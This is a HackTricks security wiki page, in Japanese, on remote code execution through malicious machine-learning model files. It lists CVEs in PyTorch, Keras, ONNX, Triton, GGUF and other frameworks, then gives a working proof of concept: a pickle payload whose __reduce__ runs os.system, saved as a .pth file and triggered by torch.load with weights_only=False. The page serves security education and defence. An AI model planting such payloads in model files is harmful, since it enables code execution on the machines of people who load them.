# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

機械学習モデルは通常、ONNX、TensorFlow、PyTorchなどの異なる形式で共有されます。これらのモデルは、開発者のマシンや本番システムにロードされて使用されます。通常、モデルには悪意のあるコードが含まれていないはずですが、モデルのロードライブラリの脆弱性や意図された機能として、モデルを使用してシステム上で任意のコードを実行できる場合があります。

執筆時点でのこの種の脆弱性のいくつかの例は次のとおりです：

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルチェックポイント内の悪意のあるピクルがコード実行を引き起こす（`weights_only`の保護をバイパス）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルダウンロードがコード実行を引き起こす; 管理APIにおけるJavaデシリアライズRCE                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルをロードすると`yaml.unsafe_load`を使用（コード実行） <br> **Lambda**レイヤーを使用したモデルのロードは任意のPythonコードを実行する          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 作成された`.tflite`モデルが整数オーバーフローを引き起こし→ヒープ破損（潜在的RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`を介してモデルをロードすると、攻撃者の`__reduce__`ペイロードを持つピクルが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`のデフォルトはピクルオブジェクト配列を許可していた – 悪意のある`.npy/.npz`がコード実行を引き起こす                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNXモデルの外部ウェイトパスがディレクトリを脱出できる（任意のファイルを読み取る） <br> 悪意のあるONNXモデルtarが任意のファイルを上書きできる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | カスタムオペレーターを持つモデルは攻撃者のネイティブコードをロードする必要がある; 複雑なモデルグラフが論理を悪用して意図しない計算を実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`が有効なモデルロードAPIを使用すると、相対パスのトラバーサルが可能になり、ファイルを書き込むことができる（例：`.bashrc`を上書きしてRCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 形式が不正なGGUFモデルファイルがパーサー内でヒープバッファオーバーフローを引き起こし、被害者システムでの任意のコード実行を可能にする                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 悪意のあるHDF5（`.h5`）モデルがLambdaレイヤーコードを持ち、ロード時に実行される（Kerasのsafe_modeは古い形式をカバーしていない – “ダウングレード攻撃”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのMLツール（例：ピクルベースのモデル形式、Python `pickle.load`）は、緩和策が講じられない限り、モデルファイルに埋め込まれた任意のコードを実行します | |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるようなPythonピクルベースのモデルは、`weights_only=True`でロードされない場合、システム上で任意のコードを実行するために使用される可能性があります。したがって、上記の表にリストされていなくても、すべてのピクルベースのモデルはこの種の攻撃に特に脆弱である可能性があります。

例：

- モデルを作成する：
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルをロードする:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
